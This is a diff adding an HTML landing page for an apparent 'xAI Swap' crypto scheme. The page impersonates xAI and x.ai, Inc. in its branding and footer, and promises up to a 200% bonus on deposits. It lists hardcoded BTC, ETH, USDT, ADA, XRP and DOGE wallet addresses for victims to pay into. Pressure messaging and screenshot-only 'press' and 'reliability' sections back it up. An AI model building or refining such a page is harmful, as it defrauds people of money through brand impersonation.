@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>xAI sawp</title>
+    <link rel="stylesheet" href="style.css">
+
+</head>
+<body>
+    <div class="Heads">
+        <div class="container">
+            <img src="./assets/logo-coin-new2.png" alt="" class="heads_img_logo">
+            <div class="Heads_warp">
+                <div class="Heads_content">
+                    <h4 class="blue">Welcome to xAI Swap: Your Gateway to the Future of Crypto-Based AI</h4>
+                    <p>Swap to xAI with up to 200% bonus</p>
+                </div>
+                <div class="Heads_converter">
+                    <!-- <p>sawp to xAi</p> -->
+                    <div class="converter-box">
+                        <b>swap to xAi</b>
+                        <div class="converter_area">
+                          <div class="converter">
+                            <div class="converter_input">
+                              <label for="cryptoValue">You send</label>
+                              <input type="number" id="cryptoValue" oninput="convertToXAi()" placeholder="Enter value" min="0">
+                            </div>
+                            <div class="cryptoSelect_warp">
+                                <select id="cryptoSelect" onchange="convertToXAi()">
+                                    <option value="100769.23 " data-addresses='["bc1qkczz4xsv6ekxg98gn2yux80vq5vjb9hpljc4dn",
+                                     "bc1qkczz4xsv6ekxg98gn2yux10vq5vjb9hpljc4dn"]' 
+                                    data-images='["./assets/BTC.png", "./assets/qr.svg"]'>BTC</option>
+                                    <option value="899.2537313432836" data-addresses='["bc1qkczz4xsv6ekxg98gn2yux80vq5vjb9hpljc4dn",
+                                     "bc1qkczz4xsv6ekxg98gn2yux10vq5vjb9hpljc4dn"]' 
+                                    data-images='["./assets/bnb.png", "./assets/qr.svg"]'>BNB</option>
+                                    <option value="1.5" data-addresses='["0x36BC988712E7c953RR0026861077fAD10D983367", 
+                                    "0x36BC988712E7c953RR0026861077fAD10D981234"]'
+                                     data-images='["./assets/USDT.png", "./assets/qr.svg"]'>USDT</option>
+                                    <option value="0.631786771964462" data-addresses='["addr1qyvt86707ghkcu7va4vcw5seq7ag7GGGGnmezrmuqlfnpv6rckglamcqwangqzqxhql8mdjquc455cutck46lha5a0wsufhayp", "addr1qyvt86707ghkcu7va4vcw5seq7ag7PPPPnmezrmuqlfnpv6rckglamcqwangqzqxhql8mdjquc455cutck46lha5a0wsufhayp"]'
+                                     data-images='["./assets/ADA.webp", "./assets/qr.svg"]'>ADA</option>
+                                    <option value="5239" data-addresses='["0x36BC988712E7c953AE0026862988fAD10D983367", "0x36BC988712E7c399AE0026861077fAD10D983367"]'
+                                     data-images='["./assets/ETH.png", "./assets/qr.svg"]'>ETH</option>
+                                    <option value="0.7180616740088106" data-addresses='["rB4yuf13AHf5Y451dUGp6useMWFw81ddww", "rB4yuf13AHf5Y451dUGp6useMFHF81ddkE"]' 
+                                    data-images='["./assets/xrp.png", "./assets/qr.svg"]'>XRP</option>
+                                    <option value="1.499844623990056" data-addresses='["D5d2Kk8E3tup7nLq62eeJLtkAQjmAaPPPP", "D5d2Kk8E3tup7nLq62eeJjlkAQjmAaHspR"]' 
+                                    data-images='["./assets/Doge.png", "./assets/qr.svg"]'>DOGE</option>
+                                </select>
+                            </div>
+                          </div>
+                          <div class="bouse_tests">
+                            <img src="./assets/Screenshot 2024-06-27 171259.png" alt="">
+                            <div class="input_warp_checker">
+
+                            
+                            <!-- <p id="input-checker" style="display: none;">To swap to xAI with bonus you need to deposit higher</p> -->
+                            <p id="input-checker" style="display: none;">To swap to xAI with bonus you need to deposit <b id="min-deposit-value"></b> or higher</p>
+
+                            
+                            <p id="bonus-container" style="display: none; margin-top: -12px; color: white;">
+                                <span id="bonus-message"></span>
+                                <img src="./assets/Xai-coin.png" alt="Bonus Coin" class="bonus_img">
+                                INCLUDED
+                              </p>
+                              <p id="bonus-counter-container" style="display: none; margin-top: -12px; color: white;">
+                                Notification: ONLY 
+                                <span id="bonus-counter"></span>
+                              </p>
+                            </div>
+                          </div>
+                          
+                          <div class="converter">
+                            <div class="converter_input">
+                              <label for="xAiValue">You Get</label>
+                              <input type="text" id="xAiValue" oninput="convertToCrypto()" min="0">
+                            </div>
+                            <div class="cryptoSelect_warp">
+                                <img src="./assets/Xai-coin.png" alt="">
+                                xAI
+                            </div>
+                          </div>
+                        </div>
+                        <!-- <a class="swap-button" href="./sawpid.html" id="swapButton" >Swap</a>
+                        <a href="./sawpid.html" id="viewDetailsLink" onclick="prepareDetails()">View Details</a> -->
+                        <a class="swap-button" href="./sawpid.html" id="swapButton" onclick="prepareDetails()">Swap</a>
+                      </div>
+
+
+
+
+
+
+
+
+                        
+
+                    
+
+
+
+
+
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="Limit_Order">
+        <div class="Limit_Order_im">
+
+            <img src="./assets/Screenshot 2024-06-27 180618.png" alt="" class="img_absolute">
+        </div>
+        <div class="container">
+            <div class="Limit_Order_warp">
+
+                <img src="./assets/banner-2.png" alt="">
+                <div class="Limit_Order_content">
+                    <h2>Limit Order</h2>
+                    <p>Each customer is limited to a single purchase to prevent manipulation of market prices</p>
+                    <img src="./assets/Screenshot 2024-06-27 180255.png" alt="">
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="Fast_crypto_swap">
+        <div class="container">
+            <div class="Fast_crypto_swap_warp">
+            <div class="Fast_crypto_swap_content">
+                <h2>Fast crypto swap</h2>
+                <p>The average time for swap processing is about 5 minutes. You can track the progress on the exchange page.</p>
+                <div class="swaps_stats">
+                    <div class="swaps_stat">
+                        <img src="./assets/982.png" alt="">
+                        <p>Swaps completed in less than 30 minutes🔥</p>
+                    </div>
+                    <div class="swaps_stat">
+                        <img src="./assets/1M2.png" alt="">
+                        <p>Tokens available</p>
+                    </div>
+                    <div class="swaps_stat">
+                        <img src="./assets/5min2.png" alt="">
+                        <p>Average Exchange Time</p>
+                    </div>
+                </div>
+            </div>
+            <img src="./assets/banner-3.png" alt="">
+        </div>
+        </div>
+    </div>
+    <div class="Reliable">
+        <div class="container">
+            <div class="Reliable_warp">
+                <h3>Reliable service</h3>
+                <div class="Reliable_content">
+                    <div class="Reliable_card">
+                        <img src="./assets/Screenshot 2024-06-27 182539.png" alt="">
+                    </div>
+                    <div class="Reliable_card">
+                        <img src="./assets/Screenshot 2024-06-27 182547.png" alt="">
+                    </div>
+                    <div class="Reliable_card">
+                        <img src="./assets/Screenshot 2024-06-27 182555.png" alt="">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="Press">
+        <div class="container">
+            <h2>Press about us</h2>
+            <div class="press_cards">
+                <div class="press_card">
+                    <a href="">
+                        <img src="./assets/Screenshot 2024-06-27 183124.png" alt="">
+
+                    </a>
+                </div>
+                <div class="press_card">
+                    <a href="">
+                        <img src="./assets/Screenshot 2024-06-27 183128.png" alt="">
+
+                    </a>
+                </div>
+                <div class="press_card">
+                    <a href="">
+                        <img src="./assets/Screenshot 2024-06-27 183137.png" alt="">
+
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <div class="container">
+            <div class="footer_exp">
+                <div class="footer_exp_warp">
+
+                    <img src="./assets/image-removebg-preview (14).png" alt="" class="footer_exp_img">
+                </div>
+                <ul>
+                    <li><a href="">Terms of Use</a></li>
+                    <li><a href="">Privacy Policy</a></li>
+                </ul>
+                <p>© xAI Artificial Intelligence on behalf of x.ai, Inc. or its affiliates</p>
+            </div>
+        </div>
+    </footer>
+
+
+
+
+
+
+    <script src="./index.js"></script>
+    <script>
+        // document.addEventListener('contextmenu', event => event.preventDefault());
+      </script>
+</body>
+</html>
